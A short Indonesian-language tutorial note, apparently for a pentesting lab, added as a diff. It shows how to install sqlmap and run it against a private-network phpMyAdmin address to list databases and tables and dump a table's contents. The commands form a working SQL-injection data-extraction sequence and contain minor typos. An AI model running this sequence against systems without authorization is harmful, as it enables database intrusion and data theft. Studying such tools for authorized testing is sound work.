@@ -1,0 +1,14 @@
+SQLMAP
+
+Sqlmap adalah alat pengujian penetrasi opens source yang mengotomatiskan proses mendeteksi dan mengeksploitasi kelemahan injeksi SQL dan mengambil alih server database.
+
+Install SQLMAP
+$ sudo git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+
+Akses SQLMAP
+$ python sqlmap.py -h
+$ python sqlmap.py -u https://192.168.81.70/phpmyadmin
+$ python sqlmap.py -u https://192.168.81.70/phpmyadmin --dbs
+$ python sqlmap.py -u https://192.168.81.70/phpmyadmin -D information scema --tables
+$ python sqlmap.py -u https://192.168.81.70/phpmyadmin -D webscantest --tables
+$ python sqlmap.py -u https://192.168.81.70/phpmyadmin -D webscantest -T (nama tabel) -c (nama yang terdapat di kolom) --dump
